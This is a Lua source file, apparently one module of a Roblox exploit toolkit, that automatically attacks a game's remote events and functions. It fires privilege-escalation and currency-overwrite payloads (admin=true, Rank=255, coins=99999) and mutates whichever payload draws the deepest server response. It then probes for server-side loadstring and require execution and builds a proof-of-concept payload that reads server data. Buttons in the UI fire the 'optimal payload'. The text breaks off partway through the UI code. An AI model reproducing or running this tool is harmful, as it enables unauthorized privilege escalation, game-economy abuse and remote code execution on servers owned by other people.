-- Oracle // 22_vex.lua
-- VEX — Vulnerability Execution Engine
-- Bridges AVD findings to systematic exploitation
-- Maps handler logic trees from response observation
-- Surfaces the exact payload that reaches the deepest execution path
local G      = ...
local C      = G.C
local TI     = G.TI
local mk     = G.mk
local tw     = G.tw
local corner = G.corner
local stroke = G.stroke
local pad    = G.pad
local listV  = G.listV
local listH  = G.listH
local mkRow  = G.mkRow
local mkSep  = G.mkSep
local vs     = G.vs
local snap   = G.snap
local dif    = G.dif
local hookR  = G.hookR
local rlog   = G.rlog
local CFG    = G.CFG
local CON    = G.CON
local RepS   = G.RepS
local LP     = G.LP

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- VEX ENGINE
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

-- Probe vocabulary — structured inputs designed to trigger
-- specific server-side logic branches
local PROBE_VOCAB = {
    -- Role / permission escalation attempts
    roles = {
        "admin","owner","moderator","developer","staff",
        "vip","premium","god","superadmin","root",
        "Admin","Owner","VIP","Premium","God","ADMIN",
        true, 1, 999, "true", "1",
    },
    -- State-setting keys developers commonly write handlers for
    stateKeys = {
        "coins","cash","money","gems","tokens","credits",
        "level","xp","exp","rank","score","points",
        "health","maxHealth","speed","damage","armor",
        "admin","vip","premium","banned","muted","verified",
        "Coins","Cash","Level","XP","Admin","VIP",
    },
    -- Common table payload structures
    tableProbes = {
        {action="buy",       amount=1},
        {action="sell",      amount=1},
        {action="give",      amount=99999},
        {action="set",       value=99999},
        {action="admin",     level=5},
        {type="purchase",    id=1},
        {type="reward",      id=1},
        {command="teleport", target="baseplate"},
        {command="kick",     reason="test"},
        {command="ban",      userId=LP.UserId},
        {event="grant",      item="sword"},
        {event="unlock",     id=1},
        {PlayerName=LP.Name, UserId=LP.UserId, Admin=true},
        {UserId=LP.UserId,   Role="admin", Rank=255},
    },
    -- Edge / overflow values
    edgeValues = {
        0, -1, 2^53, 2^53+1, -2^53,
        math.huge, -math.huge, 0/0,
        "", " ", "\0", "\n",
        "nil", "null", "false", "true",
        {}, {nil}, {[1]=nil},
        LP.UserId, game.PlaceId,
    },
    -- Execution probe strings (safe — tests if handler evals input)
    execProbes = {
        "print('VEX')",
        "return 1+1",
        "os.clock()",
        "})(", -- syntax break
        "[[VEX]]",
        "\27Lua",  -- Lua bytecode header
    },
}

-- Result record for a single probe
local function newProbeResult(payload, tag)
    return {
        payload      = payload,
        tag          = tag or "unknown",
        ok           = false,
        responses    = {},
        deltas       = {},
        retStr       = "",
        elapsed      = 0,
        depth        = 0,   -- how many state changes / responses (higher = deeper path)
        interesting  = false,
    }
end

-- Fire a single probe and capture everything
local function fireProbe(remote, payload)
    local ev={}
    local function col(root)
        local ok,d=pcall(function() return root:GetDescendants() end)
        if not ok then return end
        for _,x in ipairs(d) do if x:IsA("RemoteEvent") then table.insert(ev,x) end end
    end
    col(RepS); col(workspace)

    local before = snap()
    for k in pairs(rlog) do rlog[k]=nil end
    local conns  = hookR(ev)
    local t0     = tick()

    local args = type(payload)=="table" and payload or {payload}
    local ok, ret = pcall(function()
        if remote:IsA("RemoteFunction") then
            return remote:InvokeServer(table.unpack(args))
        else
            remote:FireServer(table.unpack(args))
            return nil
        end
    end)

    local elapsed = (tick()-t0)*1000

    task.wait(math.max(0.05, CFG.RW))
    local dl=tick()+CFG.WD
    while tick()<dl do task.wait(0.05); if #rlog>0 then break end end

    local after = snap()
    for _,c in ipairs(conns) do pcall(function() c:Disconnect() end) end

    local responses={}
    for _,r in ipairs(rlog) do table.insert(responses,r) end
    for k in pairs(rlog) do rlog[k]=nil end

    local deltas = dif(before, after)

    local retStr
    if not ok then
        retStr = "ERR:"..tostring(ret):sub(1,60)
    elseif ret == nil then retStr = "nil"
    elseif type(ret)=="table" then
        local p={}; for k,v in pairs(ret) do
            table.insert(p,tostring(k).."="..vs(v):sub(1,20))
        end
        retStr = "{"..table.concat(p,","):sub(1,80).."}"
    else
        retStr = vs(ret):sub(1,80)
    end

    return {
        ok        = ok,
        responses = responses,
        deltas    = deltas,
        retStr    = retStr,
        elapsed   = elapsed,
        depth     = #responses * 3 + #deltas * 2 + (ok and 1 or 0),
        interesting = #responses>0 or #deltas>0,
    }
end

-- Logic tree node
local function newNode(label, payload, depth)
    return {
        label    = label,
        payload  = payload,
        depth    = depth or 0,
        result   = nil,
        children = {},
        winning  = false,
    }
end

-- VEX session structure
local SESSIONS = {}

local function createSession(remoteName, vuln)
    local id = "vex_"..tostring(tick()):gsub("%.", "_")
    local session = {
        id         = id,
        remote     = remoteName,
        vuln       = vuln,
        phase      = "idle",  -- idle > baseline > probe > escalate > done
        nodes      = {},      -- all probed nodes
        winNode    = nil,     -- highest depth node found
        baseline   = nil,     -- response fingerprint before any probing
        tree       = {},      -- logic tree root nodes
        logFn      = nil,
        aborted    = false,
    }
    SESSIONS[id] = session
    return session
end

-- Find remote instance
local function findR(name)
    local t=nil
    local function sc(root)
        local ok,d=pcall(function() return root:GetDescendants() end)
        if not ok then return end
        for _,x in ipairs(d) do
            if (x:IsA("RemoteEvent") or x:IsA("RemoteFunction"))
            and x.Name==name then t=x; return end
        end
    end
    sc(RepS); if not t then sc(workspace) end
    return t
end

-- Phase 1: Baseline — fire empty and nil to establish
-- what "normal" looks like for this handler
local function runBaseline(session, remote, logFn)
    logFn("INFO","Phase 1 — Baseline","Establishing normal handler response")
    session.phase = "baseline"

    local empty = fireProbe(remote, {})
    local nilProbe = fireProbe(remote, {nil})

    session.baseline = {
        emptyDepth  = empty.depth,
        emptyRet    = empty.retStr,
        emptyDeltas = #empty.deltas,
        nilDepth    = nilProbe.depth,
        nilRet      = nilProbe.retStr,
    }

    logFn(empty.ok and "CLEAN" or "INFO",
        ("Empty probe — %.0fms — depth %d"):format(empty.elapsed, empty.depth),
        "ret: "..empty.retStr)
    logFn(nilProbe.ok and "CLEAN" or "INFO",
        ("Nil probe — %.0fms — depth %d"):format(nilProbe.elapsed, nilProbe.depth),
        "ret: "..nilProbe.retStr)

    return session.baseline
end

-- Phase 2: Probe — systematic vocabulary probing
-- Each probe tagged by category so we know what triggered response
local function runProbePhase(session, remote, logFn, progressFn)
    logFn("INFO","Phase 2 — Probe","Systematic vocabulary scan across "..
        (#PROBE_VOCAB.roles + #PROBE_VOCAB.tableProbes + #PROBE_VOCAB.edgeValues).." payloads")
    session.phase = "probe"

    local probes = {}

    -- Role escalation probes
    for _, role in ipairs(PROBE_VOCAB.roles) do
        table.insert(probes, {
            tag="ROLE", payload={role},
            label=("role=%s"):format(tostring(role))
        })
        table.insert(probes, {
            tag="ROLE_TABLE",
            payload={{role=role, admin=true, level=999}},
            label=("role_table[%s]"):format(tostring(role))
        })
    end

    -- Structured table probes
    for _, tbl in ipairs(PROBE_VOCAB.tableProbes) do
        local parts={}
        for k,v in pairs(tbl) do table.insert(parts,k.."="..tostring(v)) end
        table.insert(probes, {
            tag="TABLE",
            payload={tbl},
            label=table.concat(parts,","):sub(1,40)
        })
    end

    -- State key probes — {key=99999}
    for _, key in ipairs(PROBE_VOCAB.stateKeys) do
        local tbl = {}; tbl[key] = 99999
        table.insert(probes, {
            tag="STATE",
            payload={tbl},
            label=(key.."=99999")
        })
    end

    -- Edge value probes
    for _, edge in ipairs(PROBE_VOCAB.edgeValues) do
        table.insert(probes, {
            tag="EDGE",
            payload={edge},
            label=("edge["..vs(edge):sub(1,20).."]")
        })
    end

    -- Execution probes
    for _, exec in ipairs(PROBE_VOCAB.execProbes) do
        table.insert(probes, {
            tag="EXEC",
            payload={exec},
            label=("exec["..exec:sub(1,20).."]")
        })
    end

    local bestNode = nil
    local baseDepth = session.baseline and session.baseline.emptyDepth or 0

    for i, probe in ipairs(probes) do
        if session.aborted then break end
        if progressFn then progressFn(i, #probes, probe.label) end
        task.wait(0.08)

        local result = fireProbe(remote, probe.payload)
        local node   = newNode(probe.label, probe.payload, result.depth)
        node.result  = result
        node.tag     = probe.tag
        table.insert(session.nodes, node)

        -- More interesting than baseline = flag it
        if result.depth > baseDepth then
            node.interesting = true
            if not bestNode or result.depth > bestNode.result.depth then
                bestNode = node
            end
            logFn(result.interesting and "FINDING" or "DELTA",
                ("[%s] %s — depth %d (+%d)"):format(
                    probe.tag, probe.label, result.depth,
                    result.depth - baseDepth),
                "ret: "..result.retStr..
                (#result.deltas>0 and
                    ("  state: "..result.deltas[1].path.." → "..result.deltas[1].av) or ""),
                true)

            for _, ch in ipairs(result.deltas) do
                logFn(ch.bad and "PATHOLOG" or "DELTA",
                    "State change: "..ch.path,
                    ch.bv.." → "..ch.av, true)
            end
        end
    end

    if bestNode then
        session.winNode = bestNode
        logFn("FINDING",
            ("Best payload found: [%s] %s"):format(bestNode.tag, bestNode.label),
            ("depth=%d  responses=%d  deltas=%d"):format(
                bestNode.result.depth,
                #bestNode.result.responses,
                #bestNode.result.deltas),
            true)
    else
        logFn("CLEAN","No response variation detected across "..#probes.." probes",
            "Handler likely has server-side validation or is a pure signal")
    end

    return session.nodes, bestNode
end

-- Phase 3: Escalation — take the best payload and
-- mutate it toward maximum server response depth
local function runEscalation(session, remote, logFn)
    if not session.winNode then
        logFn("INFO","Phase 3 — Escalation skipped","No winning payload to escalate from")
        return nil
    end

    logFn("INFO","Phase 3 — Escalation",
        "Mutating best payload to maximise server execution depth")
    session.phase = "escalate"

    local winPayload = session.winNode.payload
    local winDepth   = session.winNode.result.depth
    local bestPayload = winPayload
    local bestDepth   = winDepth

    -- Mutation strategies
    local mutations = {}

    -- Strategy 1: amplify numeric values
    if type(winPayload[1]) == "table" then
        for k, v in pairs(winPayload[1]) do
            if type(v) == "number" then
                local mutated = {}
                for k2,v2 in pairs(winPayload[1]) do mutated[k2]=v2 end
                mutated[k] = 2^53
                table.insert(mutations, {
                    label="amplify_"..k,
                    payload={mutated}
                })
                mutated = {}
                for k2,v2 in pairs(winPayload[1]) do mutated[k2]=v2 end
                mutated[k] = -1
                table.insert(mutations, {
                    label="neg_"..k,
                    payload={mutated}
                })
            end
        end
    end

    -- Strategy 2: add escalation keys to winning table
    local escalationKeys = {
        admin=true, Admin=true, owner=true, superadmin=true,
        level=999, rank=255, role="admin", permission=999,
        bypass=true, override=true, serverTrust=true,
    }
    if type(winPayload[1]) == "table" then
        for ek, ev2 in pairs(escalationKeys) do
            local mutated = {}
            for k2,v2 in pairs(winPayload[1]) do mutated[k2]=v2 end
            mutated[ek] = ev2
            table.insert(mutations, {
                label="escalate_"..ek,
                payload={mutated}
            })
        end
    end

    -- Strategy 3: string values → admin strings
    if type(winPayload[1]) == "string" then
        for _, role in ipairs({"admin","owner","god","superadmin","root"}) do
            table.insert(mutations, {label="role_"..role, payload={role}})
        end
    end

    -- Strategy 4: wrap winning payload in common wrapper structures
    if type(winPayload[1]) == "table" then
        table.insert(mutations, {
            label="wrapped_data",
            payload={{data=winPayload[1], auth="admin", bypass=true}}
        })
        table.insert(mutations, {
            label="wrapped_player",
            payload={{player=LP, payload=winPayload[1], admin=true}}
        })
    end

    local improved = false
    for _, mut in ipairs(mutations) do
        if session.aborted then break end
        task.wait(0.08)
        local result = fireProbe(remote, mut.payload)

        if result.depth > bestDepth then
            bestDepth   = result.depth
            bestPayload = mut.payload
            improved    = true
            logFn("FINDING",
                ("Escalation improved: %s — depth %d"):format(mut.label, result.depth),
                "ret: "..result.retStr..
                (#result.deltas>0 and
                    "  delta: "..result.deltas[1].path.." → "..result.deltas[1].av or ""),
                true)
            for _, ch in ipairs(result.deltas) do
                logFn(ch.bad and "PATHOLOG" or "DELTA",
                    "State change: "..ch.path, ch.bv.." → "..ch.av, true)
            end
        end
    end

    if not improved then
        logFn("INFO","Escalation: no improvement over base winning payload",
            "Winning payload is already at maximum observable depth")
    end

    session.finalPayload = bestPayload
    session.finalDepth   = bestDepth
    return bestPayload, bestDepth
end

-- Build human-readable payload string
local function payloadStr(payload)
    if not payload or #payload == 0 then return "(empty)" end
    local parts = {}
    for _, v in ipairs(payload) do
        if type(v) == "table" then
            local tp={}
            for k2,v2 in pairs(v) do
                table.insert(tp, tostring(k2).."="..vs(v2):sub(1,20))
            end
            table.insert(parts, "{"..table.concat(tp,", ").."}")
        else
            table.insert(parts, vs(v))
        end
    end
    return table.concat(parts, ", ")
end

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- PHASE 4 — CODE EXECUTION DETECTION
-- Specifically tests whether the handler evaluates string input as code
-- Three sub-paths: loadstring · require · indirect eval
-- Each probe has an expected server-side result if evaluation occurs
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

-- Sentinel values the server would only return if it evaluated our input
local EXEC_SENTINELS = {
    -- {input, expectedIfEval, description, path}
    {
        input    = "return 2+2",
        expected = {"4", 4},
        desc     = "Arithmetic eval — server returns 4 only if loadstring ran",
        path     = "loadstring",
    },
    {
        input    = "return game.PlaceId",
        expected = {tostring(game.PlaceId), game.PlaceId},
        desc     = "PlaceId echo — server returns our PlaceId only if code ran",
        path     = "loadstring",
    },
    {
        input    = "return tostring(tick()):sub(1,5)",
        expected = nil,   -- dynamic — match prefix of current tick
        desc     = "Tick prefix — server returns live timestamp prefix if eval",
        path     = "loadstring",
        dynamic  = true,
        dynCheck = function(ret)
            -- Server-side tick will be within 10 seconds of our tick
            local n = tonumber(ret)
            return n and math.abs(n - math.floor(tick())) < 60
        end,
    },
    {
        input    = "return _VERSION",
        expected = {"Luau", "5.1", "5.2", "5.3"},
        desc     = "_VERSION echo — server Lua version string confirms eval",
        path     = "loadstring",
    },
    {
        input    = "return workspace.Name",
        expected = {"Workspace", "workspace"},
        desc     = "Workspace.Name — only accessible if code ran server-side",
        path     = "loadstring",
    },
    -- require path probes
    {
        input    = 0,   -- require(0) — invalid ID, specific error message
        expected = nil,
        desc     = "require(0) error — specific error text confirms require path",
        path     = "require",
        errCheck = function(errStr)
            -- Roblox require errors contain specific text
            return errStr:lower():find("require") ~= nil
                or errStr:lower():find("module") ~= nil
                or errStr:lower():find("asset") ~= nil
        end,
    },
    {
        input    = game.PlaceId,  -- require(placeId) — place is not a module
        expected = nil,
        desc     = "require(placeId) — non-module error confirms require path",
        path     = "require",
        errCheck = function(errStr)
            return errStr:lower():find("modulescript") ~= nil
                or errStr:lower():find("module script") ~= nil
                or errStr:lower():find("not a") ~= nil
        end,
    },
    -- pcall/xpcall indirect eval
    {
        input    = "pcall(print,'VEX_PROBE')",
        expected = nil,
        desc     = "pcall string — evaluating this as code would call pcall",
        path     = "loadstring",
        dynCheck = function(ret)
            return ret ~= nil and ret ~= "" and ret ~= "nil"
        end,
    },
    -- Table-wrapped code (some handlers unwrap and eval)
    {
        input    = {code="return 2+2", exec=true},
        expected = {"4", 4},
        desc     = "Table-wrapped code — handler may unwrap .code field and eval",
        path     = "loadstring_table",
    },
    {
        input    = {script="return game.PlaceId", run=true},
        expected = {tostring(game.PlaceId), game.PlaceId},
        desc     = "Table .script field — handler may eval .script string",
        path     = "loadstring_table",
    },
    {
        input    = {command="loadstring('return 1')()", admin=true},
        expected = nil,
        desc     = "Command field with loadstring call — eval via command parser",
        path     = "indirect",
        dynCheck = function(ret)
            return ret ~= nil and ret ~= "nil"
        end,
    },
}

local function runCodeExecDetection(session, remote, logFn)
    logFn("INFO","Phase 4 — Code Execution Detection",
        "Probing for loadstring · require · indirect eval paths")
    session.phase = "codeexec"

    local findings = {
        loadstring = nil,
        require    = nil,
        indirect   = nil,
    }
    local confirmed = false

    for _, sentinel in ipairs(EXEC_SENTINELS) do
        if session.aborted then break end
        task.wait(0.1)

        local payload
        if type(sentinel.input) == "table" then
            payload = {sentinel.input}
        else
            payload = {sentinel.input}
        end

        local result = fireProbe(remote, payload)
        local ret    = result.retStr
        local errStr = (not result.ok) and ret or ""

        local hit = false
        local hitReason = ""

        -- Check expected return values
        if sentinel.expected then
            for _, exp in ipairs(sentinel.expected) do
                local expStr = tostring(exp)
                if ret == expStr or ret:find(expStr, 1, true) then
                    hit = true
                    hitReason = ("return value '%s' matches expected '%s'"):format(
                        ret:sub(1,40), expStr)
                    break
                end
            end
        end

        -- Check dynamic validator
        if not hit and sentinel.dynCheck then
            local checkVal = result.ok and ret or errStr
            if sentinel.dynCheck(checkVal) then
                hit = true
                hitReason = ("dynamic check passed on '%s'"):format(checkVal:sub(1,40))
            end
        end

        -- Check error pattern (for require probes)
        if not hit and sentinel.errCheck and not result.ok then
            if sentinel.errCheck(errStr) then
                hit = true
                hitReason = ("error pattern matched: '%s'"):format(errStr:sub(1,60))
            end
        end

        if hit then
            confirmed = true
            local path = sentinel.path
            if not findings[path] then
                findings[path] = {
                    probe      = sentinel,
                    payload    = payload,
                    retStr     = ret,
                    hitReason  = hitReason,
                }
            end

            logFn("FINDING",
                ("⚡ CODE EXEC CONFIRMED — %s"):format(path:upper()),
                sentinel.desc.."\n"..hitReason,
                true)

            -- Build the exploit payload for this path
            if path == "loadstring" or path == "loadstring_table" then
                -- Craft a proof-of-concept that reads server-side data
                local exploitCode = [=[
local results = {}
table.insert(results, "PlaceId="..tostring(game.PlaceId))
table.insert(results, "JobId="..tostring(game.JobId):sub(1,8))
table.insert(results, "Players="..tostring(#game:GetService('Players'):GetPlayers()))
local ds_ok, ds = pcall(function()
    return game:GetService('DataStoreService'):GetDataStore('test')
end)
table.insert(results, "DataStore="..(ds_ok and "ACCESSIBLE" or "blocked"))
return table.concat(results, '|')
]=]
                local exploitPayload
                if path == "loadstring" then
                    exploitPayload = {exploitCode}
                else
                    -- Match the structure that triggered the hit
                    exploitPayload = session.finalPayload or payload
                end
                session.execPath    = path
                session.execPayload = exploitPayload
                session.exploitCode = exploitCode
                logFn("FINDING",
                    "Proof-of-concept payload ready",
                    "Use the EXPLOIT tab in result card to fire server-side code",
                    true)

            elseif path == "require" then
                session.execPath    = "require"
                session.requirePath = true
                logFn("FINDING",
                    "require() path confirmed",
                    "Server will load any public ModuleScript by asset ID\n"..
                    "Author a ModuleScript on Roblox → get its asset ID → fire it here",
                    true)
            end
        else
            logFn("INFO",
                ("[%s] %s"):format(sentinel.path, sentinel.desc:sub(1,50)),
                "no match — ret: "..ret:sub(1,40))
        end
    end

    session.codeExecFindings = findings
    session.codeExecConfirmed = confirmed

    if not confirmed then
        logFn("CLEAN",
            "No code execution path detected",
            "Handler does not appear to eval, loadstring, or require client input")
    else
        logFn("FINDING",
            "CODE EXECUTION PATH CONFIRMED — see result card for exploit payload",
            "This remote executes server-side code from client-controlled input",
            true)
    end

    return findings, confirmed
end

-- Full VEX run
local function runVEX(remoteName, vuln, logFn, progressFn, onComplete)
    local session = createSession(remoteName, vuln)
    session.logFn = logFn

    local remote = findR(remoteName)
    if not remote then
        logFn("INFO", remoteName, "Remote not found — cannot run VEX")
        if onComplete then onComplete(nil) end
        return
    end

    logFn("INFO","VEX started on: "..remoteName)
    if vuln then
        logFn("INFO","AVD finding: "..vuln.label, vuln.detail or "")
    end

    task.spawn(function()
        -- Phase 1
        runBaseline(session, remote, logFn)
        if session.aborted then
            if onComplete then onComplete(session) end
            return
        end
        task.wait(0.2)

        -- Phase 2
        local nodes, winNode = runProbePhase(
            session, remote, logFn, progressFn)
        if session.aborted then
            if onComplete then onComplete(session) end
            return
        end
        task.wait(0.2)

        -- Phase 3
        local finalPayload, finalDepth = runEscalation(session, remote, logFn)
        task.wait(0.2)

        -- Phase 4 — Code Execution Detection
        local codeFindings, codeConfirmed = runCodeExecDetection(
            session, remote, logFn)
        session.phase = "done"

        -- Summary
        local interesting = 0
        for _, n in ipairs(session.nodes) do
            if n.interesting then interesting += 1 end
        end

        logFn("INFO", "═══ VEX COMPLETE ═══")
        logFn(finalPayload and "FINDING" or "CLEAN",
            finalPayload and
                "OPTIMAL PAYLOAD FOUND" or
                "No exploitable path found",
            finalPayload and
                payloadStr(finalPayload) or
                "Handler appears to validate all inputs server-side",
            finalPayload ~= nil)

        if finalPayload then
            logFn("INFO",
                ("Depth: %d  ·  Interesting probes: %d / %d"):format(
                    finalDepth or 0, interesting, #session.nodes))
        end

        session.phase = "done"
        if onComplete then onComplete(session) end
    end)

    return session
end

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- VEX PAGE UI
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

local P_VEX = mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.fromScale(1,1),Visible=false,ZIndex=3},CON)

-- top bar
local TOPBAR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,32),ZIndex=4},P_VEX)
stroke(C.BORDER,1,TOPBAR)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=5},TOPBAR)

mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="⬡  VEX — VULNERABILITY EXECUTION ENGINE",
    TextColor3=Color3.fromRGB(255,80,80),TextSize=11,
    Size=UDim2.new(0,320,1,0),Position=UDim2.new(0,14,0,0),
    TextXAlignment=Enum.TextXAlignment.Left,ZIndex=5},TOPBAR)

local VEX_STATUS=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="idle",TextColor3=C.MUTED,TextSize=9,
    Size=UDim2.new(0,160,1,0),Position=UDim2.new(1,-374,0,0),
    TextXAlignment=Enum.TextXAlignment.Right,ZIndex=5},TOPBAR)

local RUN_BTN=mk("TextButton",{AutoButtonColor=false,
    BackgroundColor3=Color3.fromRGB(180,30,30),BorderSizePixel=0,
    Font=Enum.Font.GothamBold,Text="⚡ RUN VEX",TextColor3=C.WHITE,TextSize=10,
    Size=UDim2.new(0,86,0,22),Position=UDim2.new(1,-192,0.5,-11),ZIndex=6},TOPBAR)
corner(5,RUN_BTN)
do local base=Color3.fromRGB(180,30,30)
    RUN_BTN.MouseEnter:Connect(function() tw(RUN_BTN,TI.fast,{BackgroundColor3=Color3.new(math.min(base.R+.08,1),math.min(base.G+.08,1),math.min(base.B+.08,1))}) end)
    RUN_BTN.MouseLeave:Connect(function() tw(RUN_BTN,TI.fast,{BackgroundColor3=base}) end)
end

local ABORT_BTN=mk("TextButton",{AutoButtonColor=false,
    BackgroundColor3=C.CARD,BorderSizePixel=0,
    Font=Enum.Font.GothamBold,Text="⬛ ABORT",TextColor3=C.MUTED,TextSize=9,
    Size=UDim2.new(0,70,0,22),Position=UDim2.new(1,-96,0.5,-11),ZIndex=6},TOPBAR)
corner(5,ABORT_BTN); stroke(C.BORDER,1,ABORT_BTN)
ABORT_BTN.MouseEnter:Connect(function() tw(ABORT_BTN,TI.fast,{BackgroundColor3=C.SURFACE}) end)
ABORT_BTN.MouseLeave:Connect(function() tw(ABORT_BTN,TI.fast,{BackgroundColor3=C.CARD}) end)

-- body
local BODY=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,32),Size=UDim2.new(1,0,1,-32),ZIndex=3},P_VEX)

-- left: findings list + config
local VL=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.new(0,240,1,0),ZIndex=3},BODY)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(0,1,1,0),Position=UDim2.new(1,-1,0,0),ZIndex=4},VL)

-- target input
local TBAR=mk("Frame",{BackgroundColor3=C.CARD,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,36),ZIndex=4},VL)
stroke(C.BORDER,1,TBAR)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=5},TBAR)
pad(10,0,TBAR); listH(TBAR,6)
mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="Target",TextColor3=C.MUTED,TextSize=9,
    Size=UDim2.new(0,46,1,0),TextXAlignment=Enum.TextXAlignment.Left,
    ZIndex=5,LayoutOrder=1},TBAR)
local TARGET_BOX=mk("TextBox",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Text=G.RBOX and G.RBOX.Text or "",
    PlaceholderText="remote name",
    PlaceholderColor3=C.MUTED,TextColor3=C.WHITE,TextSize=10,Font=Enum.Font.Code,
    ClearTextOnFocus=false,TextXAlignment=Enum.TextXAlignment.Left,
    Size=UDim2.new(1,-60,0,22),ZIndex=5,LayoutOrder=2},TBAR)
corner(5,TARGET_BOX); stroke(C.BORDER,1,TARGET_BOX); pad(6,0,TARGET_BOX)

-- AVD findings feed
local AVD_HDR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,36),Size=UDim2.new(1,0,0,22),ZIndex=4},VL)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=5},AVD_HDR)
mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="AVD FINDINGS",TextColor3=C.MUTED,TextSize=9,
    Size=UDim2.fromScale(1,1),TextXAlignment=Enum.TextXAlignment.Center,ZIndex=5},AVD_HDR)

local FIND_SCROLL=mk("ScrollingFrame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,58),Size=UDim2.new(1,0,1,-58),
    ScrollBarThickness=3,ScrollBarImageColor3=C.ACCDIM,
    CanvasSize=UDim2.fromScale(0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,
    ZIndex=4},VL)
pad(6,6,FIND_SCROLL); listV(FIND_SCROLL,4)

local FIND_EMPTY=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="No AVD findings yet.\n\nRun AVD tab first — findings\nwill appear here for targeting.",
    TextColor3=C.MUTED,TextSize=9,TextWrapped=true,
    Size=UDim2.new(1,0,0,60),TextXAlignment=Enum.TextXAlignment.Center,
    ZIndex=5,LayoutOrder=1},FIND_SCROLL)

-- right panel: progress bar + log scroll + pinned result card
local VR=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,240,0,0),Size=UDim2.new(1,-240,1,0),ZIndex=3},BODY)

-- progress bar
local PROG_BG=mk("Frame",{BackgroundColor3=C.CARD,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,4),ZIndex=5},VR)
stroke(C.BORDER,1,PROG_BG)
local PROG_BAR=mk("Frame",{BackgroundColor3=Color3.fromRGB(180,30,30),
    BorderSizePixel=0,Size=UDim2.new(0,0,1,0),ZIndex=6},PROG_BG)
corner(2,PROG_BAR)

-- result card pinned to bottom — outside LOG_SCROLL so it's always visible
local RESULT_CARD=mk("Frame",{BackgroundColor3=Color3.fromRGB(14,4,4),
    BorderSizePixel=0,
    Position=UDim2.new(0,0,1,-96),
    Size=UDim2.new(1,0,0,96),
    ZIndex=6,Visible=false},VR)
corner(0,RESULT_CARD)
mk("Frame",{BackgroundColor3=Color3.fromRGB(255,40,40),BorderSizePixel=0,
    Size=UDim2.new(1,0,0,2),Position=UDim2.new(0,0,0,0),ZIndex=7},RESULT_CARD)
pad(10,6,RESULT_CARD); listV(RESULT_CARD,4)

local RESULT_TITLE=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="OPTIMAL PAYLOAD",TextColor3=Color3.fromRGB(255,80,80),TextSize=11,
    Size=UDim2.new(1,0,0,16),TextXAlignment=Enum.TextXAlignment.Left,
    ZIndex=7,LayoutOrder=1},RESULT_CARD)
local RESULT_PAYLOAD=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="",TextColor3=Color3.fromRGB(255,175,70),TextSize=10,TextWrapped=true,
    Size=UDim2.new(1,0,0,24),
    TextXAlignment=Enum.TextXAlignment.Left,ZIndex=7,LayoutOrder=2},RESULT_CARD)

local RESULT_BTNROW=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,26),ZIndex=7,LayoutOrder=3},RESULT_CARD)
listH(RESULT_BTNROW,6)
local RESULT_COPY=mk("TextButton",{AutoButtonColor=false,
    BackgroundColor3=Color3.fromRGB(180,30,30),BorderSizePixel=0,
    Font=Enum.Font.GothamBold,Text="Copy Payload",TextColor3=C.WHITE,TextSize=9,
    Size=UDim2.new(0,100,1,0),ZIndex=8,LayoutOrder=1},RESULT_BTNROW)
corner(5,RESULT_COPY)
local RESULT_FIRE=mk("TextButton",{AutoButtonColor=false,
    BackgroundColor3=Color3.fromRGB(140,20,20),BorderSizePixel=0,
    Font=Enum.Font.GothamBold,Text="▶ Fire Optimal",TextColor3=C.WHITE,TextSize=9,
    Size=UDim2.new(0,110,1,0),ZIndex=8,LayoutOrder=2},RESULT_BTNROW)
corner(5,RESULT_FIRE)

-- LOG_SCROLL fills space above result card
-- Size adjusts dynamically when result card is shown/hidden
local LOG_SCROLL=mk("ScrollingFrame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,4),Size=UDim2.new(1,0,1,-4),
    ScrollBarThickness=4,ScrollBarImageColor3=C.ACCDIM,
